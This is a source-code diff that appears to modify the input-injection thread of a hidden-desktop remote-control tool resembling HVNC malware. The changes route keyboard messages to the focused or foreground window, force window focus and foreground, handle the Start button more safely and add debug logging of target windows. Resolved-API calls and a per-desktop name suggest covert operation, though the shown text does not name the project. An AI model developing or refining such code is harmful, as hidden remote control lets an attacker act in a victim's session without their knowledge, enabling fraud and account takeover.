@@ -40,8 +40,94 @@ static ULONG_PTR  g_gdiplusToken;
 static BOOL       g_gdiplusStarted = FALSE;
 static BOOL       g_lastCaptureFailed = FALSE;
 static char       g_desktopName[MAX_PATH];
+static HWND       g_lastInputHwnd = NULL;
 static ULARGE_INTEGER lisize;
 static LARGE_INTEGER offset;
+
+static const char *InputMsgName(UINT msg)
+{
+    switch (msg)
+    {
+    case WM_LBUTTONDOWN: return "WM_LBUTTONDOWN";
+    case WM_LBUTTONUP: return "WM_LBUTTONUP";
+    case WM_RBUTTONDOWN: return "WM_RBUTTONDOWN";
+    case WM_RBUTTONUP: return "WM_RBUTTONUP";
+    case WM_MBUTTONDOWN: return "WM_MBUTTONDOWN";
+    case WM_MBUTTONUP: return "WM_MBUTTONUP";
+    case WM_LBUTTONDBLCLK: return "WM_LBUTTONDBLCLK";
+    case WM_RBUTTONDBLCLK: return "WM_RBUTTONDBLCLK";
+    case WM_MBUTTONDBLCLK: return "WM_MBUTTONDBLCLK";
+    case WM_MOUSEMOVE: return "WM_MOUSEMOVE";
+    case WM_MOUSEWHEEL: return "WM_MOUSEWHEEL";
+    case WM_CHAR: return "WM_CHAR";
+    case WM_KEYDOWN: return "WM_KEYDOWN";
+    case WM_KEYUP: return "WM_KEYUP";
+    case WM_SYSCHAR: return "WM_SYSCHAR";
+    case WM_SYSKEYDOWN: return "WM_SYSKEYDOWN";
+    case WM_SYSKEYUP: return "WM_SYSKEYUP";
+    default: return "UNKNOWN";
+    }
+}
+
+static HWND GetTopLevelWindow(HWND hWnd)
+{
+    if (!hWnd)
+        return NULL;
+
+    HWND topHwnd = hWnd;
+    while ((GetWindowLongA(topHwnd, GWL_STYLE) & WS_CHILD))
+    {
+        HWND parent = GetParent(topHwnd);
+        if (!parent)
+            break;
+        topHwnd = parent;
+    }
+    return topHwnd;
+}
+
+static void DescribeWindow(HWND hWnd, char *className, int classNameSize, char *title, int titleSize)
+{
+    if (classNameSize > 0)
+        className[0] = 0;
+    if (titleSize > 0)
+        title[0] = 0;
+
+    if (!hWnd)
+        return;
+
+    GetClassNameA(hWnd, className, classNameSize);
+    GetWindowTextA(hWnd, title, titleSize);
+}
+
+static BOOL ShouldLogInput(UINT msg)
+{
+    static DWORD moveCount = 0;
+    if (msg == WM_MOUSEMOVE)
+    {
+        ++moveCount;
+        return (moveCount % 60) == 1;
+    }
+    return TRUE;
+}
+
+static void LogInputTarget(const char *stage, UINT msg, HWND hWnd, POINT screenPoint, POINT clientPoint, BOOL result)
+{
+    char className[128];
+    char title[128];
+    DescribeWindow(hWnd, className, sizeof(className), title, sizeof(title));
+    printf("[input] %s %s hwnd=0x%p class='%s' title='%s' screen=(%ld,%ld) client=(%ld,%ld) result=%s lastError=%lu\n",
+        stage,
+        InputMsgName(msg),
+        hWnd,
+        className,
+        title,
+        screenPoint.x,
+        screenPoint.y,
+        clientPoint.x,
+        clientPoint.y,
+        result ? "ok" : "failed",
+        GetLastError());
+}
 
 static void FreePixelBuffers()
 {
@@ -925,9 +1011,18 @@ static DWORD WINAPI InputThread(LPVOID param)
         case WM_CHAR:
         case WM_KEYDOWN:
         case WM_KEYUP:
+        case WM_SYSCHAR:
+        case WM_SYSKEYDOWN:
+        case WM_SYSKEYUP:
         {
             point = lastPoint;
-            hWnd = Funcs::pWindowFromPoint(point);
+            hWnd = GetFocus();
+            if (!hWnd)
+                hWnd = GetForegroundWindow();
+            if (!hWnd)
+                hWnd = g_lastInputHwnd;
+            if (!hWnd)
+                hWnd = Funcs::pWindowFromPoint(point);
             break;
         }
         default:
@@ -939,6 +1034,14 @@ static DWORD WINAPI InputThread(LPVOID param)
             lastPoint = point;
 
             hWnd = Funcs::pWindowFromPoint(point);
+            if (!hWnd)
+            {
+                POINT emptyPoint = { 0, 0 };
+                if (ShouldLogInput(msg))
+                    LogInputTarget("drop-no-window", msg, NULL, point, emptyPoint, FALSE);
+                continue;
+            }
+
             if (msg == WM_LBUTTONUP)
             {
                 lmouseDown = FALSE;
@@ -981,13 +1084,37 @@ static DWORD WINAPI InputThread(LPVOID param)
             {
                 lmouseDown = TRUE;
                 hResMoveWindow = NULL;
+                g_lastInputHwnd = hWnd;
+
+                HWND topFocusHwnd = GetTopLevelWindow(hWnd);
+                BOOL bringResult = topFocusHwnd ? BringWindowToTop(topFocusHwnd) : FALSE;
+                BOOL foregroundResult = topFocusHwnd ? SetForegroundWindow(topFocusHwnd) : FALSE;
+                HWND activeResult = topFocusHwnd ? SetActiveWindow(topFocusHwnd) : NULL;
+                HWND focusResult = SetFocus(hWnd);
+                if (ShouldLogInput(msg))
+                {
+                    char className[128];
+                    char title[128];
+                    DescribeWindow(hWnd, className, sizeof(className), title, sizeof(title));
+                    printf("[input] focus WM_LBUTTONDOWN target=0x%p top=0x%p class='%s' title='%s' bring=%d foreground=%d active=0x%p focus=0x%p lastError=%lu\n",
+                        hWnd,
+                        topFocusHwnd,
+                        className,
+                        title,
+                        bringResult,
+                        foregroundResult,
+                        activeResult,
+                        focusResult,
+                        GetLastError());
+                }
 
                 RECT startButtonRect;
                 HWND hStartButton = Funcs::pFindWindowA("Button", NULL);
-                Funcs::pGetWindowRect(hStartButton, &startButtonRect);
-                if (Funcs::pPtInRect(&startButtonRect, point))
+                if (hStartButton && Funcs::pGetWindowRect(hStartButton, &startButtonRect) && Funcs::pPtInRect(&startButtonRect, point))
                 {
-                    Funcs::pPostMessageA(hStartButton, BM_CLICK, 0, 0);
+                    BOOL posted = Funcs::pPostMessageA(hStartButton, BM_CLICK, 0, 0);
+                    if (ShouldLogInput(msg))
+                        LogInputTarget("start-button", msg, hStartButton, point, point, posted);
                     continue;
                 }
                 else
@@ -1104,33 +1231,70 @@ static DWORD WINAPI InputThread(LPVOID param)
         }
 
         POINT screenPoint = point;
+        POINT clientPt = { 0, 0 };
 
-        for (HWND currHwnd = hWnd;;)
+        if (!hWnd)
         {
-            hWnd = currHwnd;
-            Funcs::pScreenToClient(currHwnd, &point);
-            currHwnd = Funcs::pChildWindowFromPoint(currHwnd, point);
-            if (!currHwnd || currHwnd == hWnd)
-                break;
+            if (ShouldLogInput(msg))
+                LogInputTarget("drop-no-target", msg, NULL, screenPoint, clientPt, FALSE);
+            continue;
         }
 
-        if (msg != WM_MOUSEMOVE)
+        if (mouseMsg)
         {
-            while ((Funcs::pGetWindowLongA(hWnd, GWL_STYLE) & WS_CHILD) &&
-                   (Funcs::pGetWindowLongA(hWnd, GWL_EXSTYLE) & WS_EX_NOREDIRECTIONBITMAP))
+            for (HWND currHwnd = hWnd;;)
             {
-                HWND parent = Funcs::pGetParent(hWnd);
-                if (!parent)
+                hWnd = currHwnd;
+                Funcs::pScreenToClient(currHwnd, &point);
+                currHwnd = Funcs::pChildWindowFromPoint(currHwnd, point);
+                if (!currHwnd || currHwnd == hWnd)
                     break;
-                hWnd = parent;
+            }
+
+            if (msg != WM_MOUSEMOVE)
+            {
+                while ((Funcs::pGetWindowLongA(hWnd, GWL_STYLE) & WS_CHILD) &&
+                    (Funcs::pGetWindowLongA(hWnd, GWL_EXSTYLE) & WS_EX_NOREDIRECTIONBITMAP))
+                {
+                    HWND parent = Funcs::pGetParent(hWnd);
+                    if (!parent)
+                        break;
+                    hWnd = parent;
+                }
+            }
+
+            clientPt = screenPoint;
+            Funcs::pScreenToClient(hWnd, &clientPt);
+            if (msg != WM_MOUSEWHEEL)
+                lParam = MAKELPARAM(clientPt.x, clientPt.y);
+            g_lastInputHwnd = hWnd;
+
+            if (msg == WM_LBUTTONDOWN)
+            {
+                HWND finalFocusResult = SetFocus(hWnd);
+                if (ShouldLogInput(msg))
+                {
+                    char className[128];
+                    char title[128];
+                    DescribeWindow(hWnd, className, sizeof(className), title, sizeof(title));
+                    printf("[input] final-focus WM_LBUTTONDOWN hwnd=0x%p class='%s' title='%s' focus=0x%p lastError=%lu\n",
+                        hWnd,
+                        className,
+                        title,
+                        finalFocusResult,
+                        GetLastError());
+                }
             }
         }
-        POINT clientPt = screenPoint;
-        Funcs::pScreenToClient(hWnd, &clientPt);
-        if (mouseMsg)
-            lParam = MAKELPARAM(clientPt.x, clientPt.y);
+        else
+        {
+            clientPt = screenPoint;
+        }
 
-        Funcs::pPostMessageA(hWnd, msg, wParam, lParam);
+        SetLastError(0);
+        BOOL posted = Funcs::pPostMessageA(hWnd, msg, wParam, lParam);
+        if (ShouldLogInput(msg))
+            LogInputTarget("post", msg, hWnd, screenPoint, clientPt, posted);
     }
 exit:
     printf("[!] Input thread exiting\n");
